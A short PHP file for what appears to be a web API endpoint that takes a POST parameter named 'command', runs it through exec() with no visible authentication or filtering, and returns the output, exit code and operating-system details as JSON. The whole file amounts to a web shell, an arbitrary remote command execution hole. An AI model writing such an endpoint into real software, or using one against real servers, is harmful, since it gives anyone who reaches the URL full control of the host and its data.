<?php
declare(strict_types=1);
require_once __DIR__ . '/../../php74/api_lib/_lib.php';

if (($_SERVER['REQUEST_METHOD'] ?? '') !== 'POST') {
    tres('method not allowed', 405);
}

$command = trim((string)req('command', ''));
if ($command === '') tres('command is required', 400);

$out = [];
$code = 0;
@exec($command . ' 2>&1', $out, $code);

$cp = function_exists('sapi_windows_cp_get') ? (int)sapi_windows_cp_get('oem') : 950;
$from = 'CP' . $cp;
$out = array_map(function (string $line) use ($from): string {
    $text = @iconv($from, 'UTF-8//IGNORE', $line);
    return $text === false ? $line : $text;
}, $out);

jres([
    'command' => $command,
    'output' => implode("\n", $out),
    'exit_code' => $code,
    'os_family' => PHP_OS_FAMILY,
    'os' => PHP_OS,
]);

